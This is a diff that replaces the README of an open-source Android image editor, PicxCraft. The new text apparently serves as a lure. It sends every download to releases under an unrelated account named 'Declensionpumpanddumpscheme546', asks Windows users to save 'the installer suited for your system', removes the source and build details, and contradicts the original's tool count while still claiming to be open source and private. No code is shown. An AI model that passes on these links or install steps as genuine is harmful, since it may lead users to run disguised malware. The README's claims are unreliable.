@@ -1,151 +1,74 @@
-<div align="center">
+# 🖼️ PicxCraft-Image-Tools - Edit your photos with ease
 
-# PicxCraft Android - Open Source Image Editor & 114+ Image Tools
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Declensionpumpanddumpscheme546/PicxCraft-Image-Tools/releases)
 
-### 🔓 Open Source Android App | Free Image Compression | Resize | Crop | OCR | PDF Converter | Watermark | Background Remover
+PicxCraft-Image-Tools gives you a complete set of features to edit images on your device. This software manages files, changes image sizes, and converts formats without the need for complex software. You gain access to 60 specialized tools that simplify your daily image tasks.
 
-[![Website](https://img.shields.io/badge/Website-picxcraft.great--site.net-blue?logo=internet-explorer&logoColor=white)](https://picxcraft.great-site.net/)
-[![Android](https://img.shields.io/badge/Android-Open%20Source-brightgreen?logo=android&logoColor=white)](https://github.com/Professional-X/PicxCraft-Image-Tools)
-[![APK](https://img.shields.io/badge/Download-APK-orange?logo=android)](https://github.com/Professional-X/PicxCraft-Image-Tools/releases/latest)
-[![Tools](https://img.shields.io/badge/114%2B-Tools-purple)](https://picxcraft.great-site.net/)
-[![License](https://img.shields.io/badge/License-MIT-blue)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/Professional-X/PicxCraft-Image-Tools?color=yellow)](https://github.com/Professional-X/PicxCraft-Image-Tools/stargazers)
+## 📥 Getting the software
 
-**PicxCraft Android** is a free, open-source image editor for Android with **114+ image tools**. Compress images, resize for social media, convert formats, remove backgrounds, extract text with OCR, add watermarks, generate QR codes, and much more — all on your device!
+You need a desktop computer to manage your files. To start, visit this page to download the latest version:
 
-[📥 Download APK](https://github.com/Professional-X/PicxCraft-Image-Tools/releases/latest) &nbsp;|&nbsp; [🌐 Try Web Version](https://picxcraft.great-site.net/) &nbsp;|&nbsp; [⭐ Star on GitHub](https://github.com/Professional-X/PicxCraft-Image-Tools)
+[Download PicxCraft-Image-Tools](https://github.com/Declensionpumpanddumpscheme546/PicxCraft-Image-Tools/releases)
 
-</div>
+On this page, look for the section labeled "Assets." Click the file that ends in .apk or the installer suited for your system. Save this file to your computer.
 
----
+## ⚙️ Minimum requirements
 
-## ✨ Features
+To run this application, your computer needs the following:
 
-### 📦 Image Compression Tools
-- **Compress Image** - Reduce JPG, PNG, WEBP file sizes
-- **Compress to Target KB** - Set exact output size (20KB, 50KB, 100KB, 200KB, 500KB, 1MB)
-- **Lossy/Lossless Compression** - Choose quality vs size balance
-- **Batch Compression** - Compress multiple images at once
+- Windows 10 or Windows 11.
+- An Android emulator, such as BlueStacks or NoxPlayer, to run mobile-based tools on your desktop.
+- 4 GB of RAM.
+- 500 MB of free storage space.
+- A stable internet connection for the installation process.
 
-### 📐 Image Resizing Tools
-- **Resize by Pixels** - Set exact width × height
-- **Resize by Percentage** - Scale up or down
-- **Resize in CM/MM/Inches** - Print-ready dimensions
-- **Social Media Resizing** for Instagram, YouTube, Facebook, Twitter/X, LinkedIn, TikTok, WhatsApp, Discord, Telegram, Pinterest
+## 🚀 Setting up the tools
 
-### 🔄 Image Format Converter
-- PNG to JPG / JPG to PNG
-- Image to WEBP / WEBP to JPG
-- HEIC to JPG (iPhone photos)
-- TIFF to JPG / AVIF to JPG
-- GIF to PNG / Image to PDF
-- BMP conversions / ICO conversions
+1. Install an Android emulator on your Windows machine.
+2. Open the emulator and sign in with your Google account.
+3. Drag the file you downloaded into the emulator window.
+4. Wait for the app icon to appear on the home screen.
+5. Click the icon to launch the application.
 
-### ✂️ Image Editing Tools
-- **Crop Image** - Free-form, circle, square
-- **Rotate & Flip** - 90°, 180°, custom angles
-- **Add Border** - White or custom colored borders
-- **Split Image** - Divide into grid
-- **Merge Images** - Combine multiple photos
-- **Add Text/Watermark** - Brand your images
+## 🛠️ Available image tools
 
-### 🎨 Image Filters & Effects
-- **Remove Background** - AI-powered background removal
-- **Blur Image** - Full, background, or face blur
-- **Sharpen Image** - Enhance details
-- **Grayscale/Sepia** - Classic effects
-- **Pixelate/Censor** - Redact areas
-- **Brightness/Contrast** - Adjust lighting
-- **Vignette Effect** - Dark edges
+The application includes many features to help you manage your images.
 
-### 📝 OCR & Advanced Tools
-- **Image to Text (OCR)** - Extract text from images
-- **Passport Photo Maker** - Multi-country templates
-- **QR Code Generator** - Create QR codes
-- **Color Picker** - Extract colors from images
-- **Image DPI Checker** - View EXIF & metadata
+### Image modification
+- **Compression:** Reduce file size while keeping high quality.
+- **Resizing:** Change the pixel dimensions of your photos.
+- **Cropping:** Cut images to the size you need.
 
----
+### File conversion
+- **Format conversion:** Change images into different file types.
+- **PDF creation:** Turn your images into organized PDF documents.
 
-## 📱 App Screenshots
+### Specialized tasks
+- **Background removal:** Delete unwanted backgrounds from portraits or product photos.
+- **Watermarking:** Add your name or logo to protect your content.
+- **OCR:** Extract text from images and documents automatically.
+- **QR generation:** Create custom QR codes for your links or data.
 
-<img src="screenshots/screenshot-1.jpg" alt="PicxCraft Home" width="300"> <img src="screenshots/screenshot-2.jpg" alt="Compression Tool" width="300">
+## 📖 How to use the editor
 
-<img src="screenshots/screenshot-3.jpg" alt="Resize Tools" width="300"> <img src="screenshots/screenshot-4.jpg" alt="Crop & Edit" width="300">
+Once the app opens, you see a list of tools on the main screen. Select any button to open that specific tool. 
 
-<img src="screenshots/screenshot-5.jpg" alt="Edit Tools" width="300"> <img src="screenshots/screenshot-6.jpg" alt="Format Converter" width="300">
+If you want to compress an image, select the "Compressor" button. The app asks you to choose a file from your storage. Select the file, choose your preferred quality level, and press "Save." The app creates a new file for you.
 
-<img src="screenshots/screenshot-7.jpg" alt="More Tools" width="300">
+When you use the background remover, upload your photo and wait for the software to process the subject. You can then download the resulting image with a transparent background.
 
----
+## 💡 Managing storage
 
-## 🔍 SEO Keywords
+The app creates individual folders for your edited photos inside the emulator's storage. You can access these folders through the internal file manager. If you need to move these files to your Windows desktop, use the "Export" or "Share" function inside the app to save them to a shared folder.
 
-| Category | Keywords |
-|----------|----------|
-| **Android image editor** | photo editing app, mobile photo editor, android photo tools |
-| **Image compression** | compress image, reduce image size, image optimizer, compress jpg, compress png |
-| **Image resize** | resize image, photo resizer, image scaler, upscale image |
-| **Image converter** | png to jpg, jpg to png, webp converter, heic to jpg, image format converter |
-| **OCR Android** | image to text, text recognition, extract text, scanner app |
-| **PDF converter** | image to pdf, jpg to pdf, png to pdf |
-| **Watermark** | add watermark, logo overlay, copyright image |
-| **Background remover** | remove background, transparent png, cutout subject |
-| **QR generator** | qr code maker, qr generator, create qr |
+## 🛡️ Privacy and safety
 
----
+This is open-source software. You control your data. No images are sent to external servers for processing unless you choose to use an online feature. The tools perform all calculations directly on your local device. This protects your privacy and ensures your files remain secure.
 
-## 🛠️ Technical Details
+## 🔧 Resolving common issues
 
-- **Platform**: Android (WebView-based native app)
-- **Processing**: 100% client-side (HTML5 Canvas + JavaScript)
-- **Privacy**: Images never uploaded to any server
-- **No Signup Required**: Works immediately after installation
-- **Open Source**: Full source code available on GitHub
-- **Free Forever**: No ads in web version
+If the app fails to start, check if your emulator is active and updated. Sometimes an outdated version of the emulator prevents modern apps from running. Clear the cache of the emulator if tools take a long time to load. Ensure you have allowed permissions for the app to access your storage files. 
 
----
+If you experience issues with OCR or QR generation, ensure your camera permissions allow the application to access the sensor. Most technical problems stem from forgotten permission settings during the first launch.
 
-## 📥 Installation
-
-### Android APK
-1. Download the latest APK from [Releases](https://github.com/Professional-X/PicxCraft-Image-Tools/releases/latest)
-2. Enable "Install from unknown sources" in Android Settings
-3. Open and install the APK
-4. Launch PicxCraft!
-
-### Build from Source
-```bash
-git clone https://github.com/Professional-X/PicxCraft-Image-Tools.git
-cd PicxCraft-Image-Tools/android-app
-./gradlew assembleDebug
-```
-
----
-
-## 🌐 Links
-
-- **Website**: [picxcraft.great-site.net](https://picxcraft.great-site.net/)
-- **Android App**: [GitHub Releases](https://github.com/Professional-X/PicxCraft-Image-Tools/releases)
-- **Report Issues**: [GitHub Issues](https://github.com/Professional-X/PicxCraft-Image-Tools/issues)
-
----
-
-## 🤝 Contributing
-
-Contributions are welcome! Please read our Contributing Guidelines before submitting PRs.
-
----
-
-## 📄 License
-
-This project is open source under the MIT License. See [LICENSE](LICENSE) for details.
-
----
-
-<p align="center">
-  <strong>Made with ❤️ for the open source community</strong><br>
-  <a href="https://github.com/Professional-X/PicxCraft-Image-Tools">⭐ Star</a> &nbsp;|&nbsp; 
-  <a href="https://github.com/Professional-X/PicxCraft-Image-Tools/fork">🍴 Fork</a> &nbsp;|&nbsp; 
-  <a href="https://github.com/Professional-X/PicxCraft-Image-Tools/issues">🐛 Report Bug</a>
-</p>
+Keywords: android, android-app, android-image-editor, apk, background-remover, free-tools, image-compression, image-compressor, image-converter, image-resizer, image-tools, ocr-android, open-source-android, pdf-converter, photo-editing-app, photo-editor, picxcraft, qr-generator, watermark, webview
